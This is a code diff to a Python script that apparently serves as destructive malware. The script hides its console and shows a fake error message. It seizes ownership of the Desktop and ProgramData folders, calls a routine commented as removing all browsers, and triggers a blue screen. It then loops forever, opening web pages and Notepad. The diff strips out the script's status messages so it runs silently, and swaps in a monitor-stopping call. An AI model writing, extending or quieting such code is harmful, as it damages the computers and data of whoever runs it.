@@ -10,16 +10,14 @@ HideConsole()
 ShowFuckNotification("ERR", "1x000000329: 0x0000000000000000, failed to parse function on table 0x004000003b30031000 and 0x00009B000000491A000")
 
 folder_ownership = getFolderOwner(getDesktopPath())
-print("Folder ownership:", folder_ownership)
 permissions = getOwnerShip(getDesktopPath())
-print("Permissions:", permissions)
 
 folder_path = getDesktopPath()
 result = SetOwnership(folder_path)
 if result:
-    print("Ownership set successfully!")
+    pass
 else:
-    print("Error setting ownership.")
+    pass
 
 
 default_disk = os.environ['SYSTEMDRIVE']
@@ -27,15 +25,13 @@ objects.getAllUnifiedObjectsAndDelete() # Removing all browsers
 def REMPROM():
     defaultdiskpath = default_disk + "\\ProgramData\\"
     permissions = getOwnerShip(defaultdiskpath)
-    print("Permissions:", permissions)
     folder_ownership = getFolderOwner(defaultdiskpath)
-    print("Folder ownership:", folder_ownership)
 
     result = SetOwnership(defaultdiskpath)
     if result:
-        print("Ownership set successfully!")
+        pass
     else:
-        print("Error setting ownership.")
+        pass
 
 
 
@@ -54,7 +50,7 @@ REMPROM()
 addBSOD()
 
 while True:
-    makeBuggyScreen()
+    StopMonitor()
     os.system("start https://en.wikipedia.org/wiki/Computer_virus")
     os.system("start https://psvks.github.io/psvks/uploads/fucker.html")
     os.system("start notepad.exe")
